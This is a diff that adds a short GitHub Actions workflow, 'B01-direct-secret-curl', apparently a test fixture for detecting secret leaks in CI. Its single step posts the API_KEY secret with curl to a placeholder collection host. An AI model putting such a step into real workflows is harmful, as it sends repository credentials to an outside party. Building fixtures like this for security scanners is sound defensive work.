@@ -1,0 +1,9 @@
+name: B01-direct-secret-curl
+on: workflow_dispatch
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    env:
+      API_KEY: ${{ secrets.API_KEY }}
+    steps:
+      - run: curl --data "$API_KEY" https://example.invalid/collect
